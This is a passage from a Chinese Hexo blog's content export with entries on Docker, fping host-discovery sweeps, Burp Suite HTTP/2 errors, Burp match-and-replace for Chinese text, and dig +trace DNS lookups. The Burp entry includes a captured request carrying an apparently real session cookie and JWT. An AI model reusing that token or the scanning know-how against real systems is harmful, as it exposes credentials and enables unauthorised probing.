&quot;ifconfig&quot;<br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255<br>        ether 02:42:ac:11:00:02  txqueuelen<span class="hljs-number"> 0 </span> (Ethernet)<br>        RX packets<span class="hljs-number"> 15 </span> bytes<span class="hljs-number"> 1322 </span>(1.2 KiB)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br><br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        loop  txqueuelen<span class="hljs-number"> 1000 </span> (Local Loopback)<br>        RX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_install</title>
    <link href="/2024/02/20/yunwei/applications/docker/docker_install/"/>
    <url>/2024/02/20/yunwei/applications/docker/docker_install/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><h4 id="安装指定版本docker"><a href="#安装指定版本docker" class="headerlink" title="安装指定版本docker"></a>安装指定版本docker</h4><h5 id="安装基础环境"><a href="#安装基础环境" class="headerlink" title="安装基础环境"></a>安装基础环境</h5><h3 id="redhat"><a href="#redhat" class="headerlink" title="redhat"></a>redhat</h3><h3 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h3><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><h2 id="uninstall"><a href="#uninstall" class="headerlink" title="uninstall"></a>uninstall</h2><h3 id="ubuntu-1"><a href="#ubuntu-1" class="headerlink" title="ubuntu"></a>ubuntu</h3><h3 id="redhat-1"><a href="#redhat-1" class="headerlink" title="redhat"></a>redhat</h3><h3 id="mac-1"><a href="#mac-1" class="headerlink" title="mac"></a>mac</h3><h3 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h3>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fping</title>
    <link href="/2024/02/19/security/sectools/fping/"/>
    <url>/2024/02/19/security/sectools/fping/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>日常工作过程中，需要批量探测部分IP是否存活</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>send ICMP ECHO_REQUEST packets to network hosts</p><p>通过发送 ICMP 数据包进行探测存活</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h2><p>brew install fping </p><h2 id="RedHat"><a href="#RedHat" class="headerlink" title="RedHat"></a>RedHat</h2><p>yum install fping </p><p>dnf install fping</p><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><p>apt install fping</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>fping 选项 语法</p><h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><h3 id="a"><a href="#a" class="headerlink" title="-a"></a>-a</h3><p>显示活动主机列表</p><h3 id="u"><a href="#u" class="headerlink" title="-u"></a>-u</h3><p>显示不可达主机列表</p><h3 id="g"><a href="#g" class="headerlink" title="-g"></a>-g</h3><p>制定CIDR地址或者IP地址范围</p><h3 id="f"><a href="#f" class="headerlink" title="-f"></a>-f</h3><p>从文件中读取要扫描的IP地址列表</p><h3 id="t"><a href="#t" class="headerlink" title="-t"></a>-t</h3><p>设置超时时间（等待响应的最大时间），默认 500ms</p><h3 id="r"><a href="#r" class="headerlink" title="-r"></a>-r</h3><p>设置重试次数，默认 3 次</p><h3 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h3><p>启用统计信息</p><h3 id="q"><a href="#q" class="headerlink" title="-q"></a>-q</h3><p>只显示有响应的IP地址，不显示错误信息</p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="探测单个IP地址存活性"><a href="#探测单个IP地址存活性" class="headerlink" title="探测单个IP地址存活性"></a>探测单个IP地址存活性</h2><p>fping 10.191.5.21</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  /tmp fping <span class="hljs-number">10</span>.<span class="hljs-number">191</span>.<span class="hljs-number">5</span>.<span class="hljs-number">21</span><br><span class="hljs-number">10.191.5.21</span> is unreachable<br></code></pre></td></tr></table></figure><h2 id="探测文件列表中IP地址存活性"><a href="#探测文件列表中IP地址存活性" class="headerlink" title="探测文件列表中IP地址存活性"></a>探测文件列表中IP地址存活性</h2><p>fping -f iplist.txt</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  /tmp fping -f iplist.txt<br><span class="hljs-number">10.182.14.148</span> is alive<br><span class="hljs-number">10.191.5.21</span> is unreachable<br><span class="hljs-number">10.191.5.22</span> is unreachable<br></code></pre></td></tr></table></figure><h2 id="只显示存活主机列表"><a href="#只显示存活主机列表" class="headerlink" title="只显示存活主机列表"></a>只显示存活主机列表</h2><p>fping -a -f iplist.txt</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  /tmp fping -f iplist.txt -a<br><span class="hljs-number">10.182.14.148</span><br></code></pre></td></tr></table></figure><h2 id="探测局域网CIDR内存活主机"><a href="#探测局域网CIDR内存活主机" class="headerlink" title="探测局域网CIDR内存活主机"></a>探测局域网CIDR内存活主机</h2><p>fping -a -g ip端</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">root@iZbp1191gh7vw52537lyxrZ:~# fping -a -g <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">24</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span><br><span class="hljs-number">172.16.24.136</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>burpsuite_http2</title>
    <link href="/2024/02/19/security/sectools/burpsuite/burpsuite_http2/"/>
    <url>/2024/02/19/security/sectools/burpsuite/burpsuite_http2/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>使用 burpsuite 测试过程中遇到 dashboard中的一些 event log ，对部分错误日志分析记录</p><h2 id="报错及解决方案"><a href="#报错及解决方案" class="headerlink" title="报错及解决方案"></a>报错及解决方案</h2><p>报错均 基于burp suite 2021.10.3版本 </p><h3 id="error-suite-Communication-error-domain"><a href="#error-suite-Communication-error-domain" class="headerlink" title="error-suite-Communication error:domain"></a>error-suite-Communication error:domain</h3><h4 id="报错现象"><a href="#报错现象" class="headerlink" title="报错现象"></a>报错现象</h4><p>suite：Communication error:domain</p><p>Repeater：Server ALPN does not advertise HTTP&#x2F;2 support.You can force HTTP&#x2F;2 from the Repeater menu</p><h4 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h4><p>当前版本支持 HTTP&#x2F;2，但是会存在部分请求不支持HTTP&#x2F;2，就会报Server ALPN does not advertise HTTP&#x2F;2 support.You can force HTTP&#x2F;2 from the Repeater menu错，可在INSPECTOR中进行协议切换</p><p>在 Project options -&gt; HTTP -&gt; HTTP&#x2F;2有勾选，如果服务支持将默认使用 HTTP&#x2F;2</p><p>Repeater</p><p>请求默认使用 HTTP&#x2F;2协议</p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>默认服务都会支持 HTTP&#x2F;1 协议，为避免报错信息，可以将 HTTP&#x2F;2关闭掉</p><h3 id="No-response-received-from-remote-server"><a href="#No-response-received-from-remote-server" class="headerlink" title="No response received from remote server"></a>No response received from remote server</h3><h4 id="报错现象-1"><a href="#报错现象-1" class="headerlink" title="报错现象"></a>报错现象</h4><p>dashboard 中 event log No response received from remote server</p><h4 id="报错原因-1"><a href="#报错原因-1" class="headerlink" title="报错原因"></a>报错原因</h4><p>新版本burpsuite默认支持http2，如果遇到不支持的站点，就会报错</p><h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h4><p>1、proxy-&gt;options-&gt;Miscellaneous 勾选使用http&#x2F;1.0进行通信，默认不勾选</p><p>2、Project options-&gt;HTTP-&gt;HTTP&#x2F;2取消勾选默认HTTP&#x2F;2的选项</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
      <category>burpsuite</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
      <tag>burpsuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一万小时定律</title>
    <link href="/2024/02/06/10000hours/"/>
    <url>/2024/02/06/10000hours/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>life</category>
      
    </categories>
    
    
    <tags>
      
      <tag>life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo_command</title>
    <link href="/2024/02/06/hexoblog/hexo_command/"/>
    <url>/2024/02/06/hexoblog/hexo_command/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>上传命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo g <br>hexo d<br></code></pre></td></tr></table></figure><p>文件路径</p><p>&#x2F;Users&#x2F;admin&#x2F;10000hours&#x2F;Hexo</p><p><img src="/image-20241028142042207.png" alt="image-20241028142042207"></p><p><img src="/image-20241028142056544.png" alt="image-20241028142056544"></p><p><img src="/image-20241028142107951.png" alt="image-20241028142107951"></p><p><a href="https://juejin.cn/post/7306723921717198899">https://juejin.cn/post/7306723921717198899</a></p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>proxy_match_replace_chinese</title>
    <link href="/2024/02/06/security/sectools/burpsuite/proxy_match_replace_chinese/"/>
    <url>/2024/02/06/security/sectools/burpsuite/proxy_match_replace_chinese/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>使用 burpsuite 测试过程中Proxy模块需要将数据包中的中文字符匹配验证或者匹配替换，用于验证漏洞或者隐藏身份</p><p>例如：将请求中的“信息安全”替换掉</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/v1/log</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>aidesign.test.com<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Apache=5867067965663.845.1707120756994; _ut=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImVtYWlsIjoiaGFpbmluZzMiLCJuaWNrIjoi5L2Z5rW35a6BIiwicm9sZXMiOnt9LCJvcmdhbml6YXRpb24iOlsi5L-h5oGv5a6J5YWoIl0sIm9yZ2FuaXphdGlvbnQzIjpbIuaWsOa1qumbhuWbol_lvq7ljZpf5b6u5Y2aQ09P57uE57uHIl0sImlwIjoiMTAuMjIyLjI4LjUiLCJ0aWNrZXQiOiJTVC0xMDQxOTg1LXB3RHlpZmFYM20xZjZhcmlZTnVVIiwic2VydmljZSI6Imh0dHAlM0ElMkYlMkZpLmZlLnNpbmEuY24lMkZ2ZXJpZnklMkZhdXRoJTNGYmFja3VybCUzRGh0dHAlMjUzQSUyNTJGJTI1MkZhaWRlc2lnbi53ZWliby5jb20lMjUyRiIsImxvZ2luVGltZSI6MTcwNzEyMDc3NDE2MH0sImlhdCI6MTcwNzEyMDc3NCwiZXhwIjoxNzA3MjA3MTc0fQ.G5OAkK1kN3-jCqY5728OtGlEmcF37of6YZfxep--Meg<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json,  */*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>238<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://aidesign.test.com<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://aidesign.test.com/<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Te</span><span class="hljs-punctuation">: </span>trailers<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;_type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;report&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;action&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;_exposure&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;ek&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;promptcreator&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;et&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;promptcreator&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;pk&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;187522&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;ts&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1707120897000</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dept&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test_信息安全&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;page&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;image&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;home&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;uid&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><h2 id="自动匹配解决方案"><a href="#自动匹配解决方案" class="headerlink" title="自动匹配解决方案"></a>自动匹配解决方案</h2><h3 id="匹配验证解决方案"><a href="#匹配验证解决方案" class="headerlink" title="匹配验证解决方案"></a>匹配验证解决方案</h3><p>将要匹配的中文转换为十六进制\x格式（大小写不影响），使用正则 Regex 匹配</p><p>中文转换为十六进制可以使用线上工具转换，也可以直接从请求包Hex格式中提取，提取的格式增加0x即可</p><p>例如：</p><p>字符串：信息安全  </p><p>十六进制：E4 BF A1 E6 81 AF E5 AE 89 E5 85 A8  \xE4\xBF\xA1\xE6\x81\xAF\xE5\xAE\x89\xE5\x85\xA8</p><h3 id="匹配替换解决方案"><a href="#匹配替换解决方案" class="headerlink" title="匹配替换解决方案"></a>匹配替换解决方案</h3><h4 id="中文替换为中文（未验证成功）"><a href="#中文替换为中文（未验证成功）" class="headerlink" title="中文替换为中文（未验证成功）"></a>中文替换为中文（未验证成功）</h4><p>测试过程中发现如果要将中文替换为中文，使用十六进制格式可以匹配到，但是替换不了</p><p>信息安全-&gt;总裁办</p><p>失败的测试过程：</p><p>1、替换字符转为十六进制</p><p>信息安全-&gt;总裁办</p><p>\xE4\xBF\xA1\xE6\x81\xAF\xE5\xAE\x89\xE5\x85\xA8-&gt;\xE6\x80\xBB\xE8\xA3\x81\xE5\x8A\x9E</p><p>现象：</p><p>burpsuite 请求“信息安全”字段直接替换为十六进制字符串\xE6\x80\xBB\xE8\xA3\x81\xE5\x8A\x9E</p><p>2、替换字符转为unicode字符</p><p>信息安全-&gt;总裁办</p><p>\xE4\xBF\xA1\xE6\x81\xAF\xE5\xAE\x89\xE5\x85\xA8-&gt;\u603b\u88c1\u529e</p><p>现象：</p><p>burpsuite 请求“信息安全”字段替换为去除\的字符串u603bu88c1u529e</p><p>3、替换字符直接设置为中文</p><p>信息安全-&gt;总裁办</p><p>\xE4\xBF\xA1\xE6\x81\xAF\xE5\xAE\x89\xE5\x85\xA8-&gt;总裁办</p><p>现象：</p><p>burpsuite 请求“信息安全”字段被替换为乱码字符，查看hex值发现乱码字符为 3B C1</p><h4 id="中文替换为非中文"><a href="#中文替换为非中文" class="headerlink" title="中文替换为非中文"></a>中文替换为非中文</h4><p>中文替换为英文、数字等，只需要将匹配的中文转换为十六进制\x格式，英文和数字等不需要转换</p><p>信息安全-&gt;test</p><p>\xE4\xBF\xA1\xE6\x81\xAF\xE5\xAE\x89\xE5\x85\xA8-&gt;test</p><h2 id="手动匹配解决方案"><a href="#手动匹配解决方案" class="headerlink" title="手动匹配解决方案"></a>手动匹配解决方案</h2><p>匹配替换，无论是替换为中文还是非中文字符，拦截直接修改为对应字符就行</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] http替换内容为中文的解决方案 Mi_Bo 2018-05-18 16:54:56<br>链接：<a href="https://blog.csdn.net/Mi_Bo/article/details/80366592">https://blog.csdn.net/Mi_Bo/article/details/80366592</a><br>[2] Match and Replace does not seem to work correctly with CJK characters Jackpot Sep 07, 2023 12:24PM UTC<br><a href="https://forum.portswigger.net/thread/match-and-replace-does-not-seem-to-work-correctly-with-cjk-characters-89ec4112">https://forum.portswigger.net/thread/match-and-replace-does-not-seem-to-work-correctly-with-cjk-characters-89ec4112</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
      <category>burpsuite</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
      <tag>burpsuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dns_record_operation</title>
    <link href="/2024/02/06/network/dns/dns_record_operation/"/>
    <url>/2024/02/06/network/dns/dns_record_operation/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>对常见的DNS记录及操作学习总结</p><h1 id="常见DNS记录"><a href="#常见DNS记录" class="headerlink" title="常见DNS记录"></a>常见DNS记录</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="常见通用操作"><a href="#常见通用操作" class="headerlink" title="常见通用操作"></a>常见通用操作</h1><h2 id="dig-trace-查询"><a href="#dig-trace-查询" class="headerlink" title="dig trace 查询"></a>dig trace 查询</h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p><strong>dig +trace domain</strong></p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>1、直接从根域名服务器开始查询</p><p>2、本机代替递归服务器（本地DNS服务器）完成迭代查询</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>1、本地设备向根域名服务器（.） 查询 bilibili.com</p><p><img src="/2024/02/06/network/dns/dns_record_operation/image-20240313174606319.png" alt="image-20240313174606319"></p><p>2、根域名服务器识别为.com顶级域，告知需要去顶级域名服务器（.com)查询，并将顶级域名服务器返回给本地设备</p><p><img src="/2024/02/06/network/dns/dns_record_operation/image-20240313174710207.png" alt="image-20240313174710207"></p><p>3、本地设备又向顶级域名服务器请求查询bilibili.com</p><p><img src="/2024/02/06/network/dns/dns_record_operation/image-20240313174741534.png" alt="image-20240313174741534"></p><p>4、.com顶级域名服务器没有bilibili.com记录，告知需要去查询的域名服务器</p><p><img src="/2024/02/06/network/dns/dns_record_operation/image-20240313174806843.png" alt="image-20240313174806843"></p><p>5、本地设备再次向上一步请求返回的域名服务器发起请求</p><p><img src="/2024/02/06/network/dns/dns_record_operation/image-20240313174826942.png" alt="image-20240313174826942"></p><p>6、返回查询结果</p><p><img src="/2024/02/06/network/dns/dns_record_operation/image-20240313174852834.png" alt="image-20240313174852834"></p><figure class="highlight mercury"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs mercury">root@iZbp1191gh7vw52537lyxrZ:~# dig +<span class="hljs-keyword">trace</span> bilibili.com<br><br>; &lt;&lt;&gt;&gt; DiG <span class="hljs-number">9.18</span>.<span class="hljs-number">18</span>-<span class="hljs-number">0</span>ubuntu0.<span class="hljs-number">22.04</span>.<span class="hljs-number">2</span>-Ubuntu &lt;&lt;&gt;&gt; +<span class="hljs-keyword">trace</span> bilibili.com<br>;; global options: +cmd<br>.<span class="hljs-number">9</span>INNSf.root-servers.net.<br>.<span class="hljs-number">9</span>INNSd.root-servers.net.<br>.<span class="hljs-number">9</span>INNSg.root-servers.net.<br>.<span class="hljs-number">9</span>INNSh.root-servers.net.<br>.<span class="hljs-number">9</span>INNSa.root-servers.net.<br>.<span class="hljs-number">9</span>INNSc.root-servers.net.<br>.<span class="hljs-number">9</span>INNSk.root-servers.net.<br>.<span class="hljs-number">9</span>INNSb.root-servers.net.<br>.<span class="hljs-number">9</span>INNSl.root-servers.net.<br>.<span class="hljs-number">9</span>INNSm.root-servers.net.<br>.<span class="hljs-number">9</span>INNSj.root-servers.net.<br>.<span class="hljs-number">9</span>INNSi.root-servers.net.<br>.<span class="hljs-number">9</span>INNSe.root-servers.net.<br>;; Received <span class="hljs-number">239</span> bytes from <span class="hljs-number">127.0</span>.<span class="hljs-number">0.53</span>#<span class="hljs-number">53</span>(<span class="hljs-number">127.0</span>.<span class="hljs-number">0.53</span>) in <span class="hljs-number">0</span> ms<br><br>;; UDP setup with <span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b#<span class="hljs-number">53</span>(<span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b#<span class="hljs-number">53</span>(<span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b#<span class="hljs-number">53</span>(<span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2001</span>:<span class="hljs-number">7</span>fe::<span class="hljs-number">53</span>#<span class="hljs-number">53</span>(<span class="hljs-number">2001</span>:<span class="hljs-number">7</span>fe::<span class="hljs-number">53</span>) for bilibili.com failed: network unreachable.<br>com.<span class="hljs-number">172800</span>INNSa.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSb.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSc.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSd.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSe.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSf.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSg.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSh.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSi.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSj.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSk.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSl.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSm.gtld-servers.net.<br>com.<span class="hljs-number">86400</span>INDS<span class="hljs-number">19718</span> <span class="hljs-number">13</span> <span class="hljs-number">2</span> <span class="hljs-number">8</span>ACBB0CD28F41250A80A491389424D341522D946B0DA0C0291F2D3D7 <span class="hljs-number">71</span>D7805A<br>com.<span class="hljs-number">86400</span>INRRSIGDS <span class="hljs-number">8</span> <span class="hljs-number">1</span> <span class="hljs-number">86400</span> <span class="hljs-number">20240326050000</span> <span class="hljs-number">20240313040000</span> <span class="hljs-number">30903</span> . HMM7P1NYHa5RzV8Iqk5Kko4+/<span class="hljs-number">86</span>zW+tj+amxZiFP6qFZibjGiZ0XW4Nw gToWas+AVxHF+a73XU/<span class="hljs-number">0</span>mSdL6N0xpyabRsyYYXAYaZ4lZ9W1nST5DclJ hpyGcN6bP8+fm1VKLM5wXYuZ6tyeQuvDA3g8RfsN8B5q1CT31dU6vlyL <span class="hljs-number">8</span>NfbTTSDzYnH4zZzLpojJZ5dmW6Ua3oNiFitK4Ri+<span class="hljs-number">2</span>aOtv81WBLRqNHI WjRRbiP5JBAZDAj+iV+vQATwmH2gDxXBe6WN1KTbzcV7Nc9ds0l+B1Oy SF4zKaRP3wu3P0IyMzwDT63W76yCsesmW1+SIJpweI2HLA9MBx/+DZmZ iz7i6Q<span class="hljs-built_in">=</span><span class="hljs-built_in">=</span><br>;; Received <span class="hljs-number">1172</span> bytes from <span class="hljs-number">198.97</span>.<span 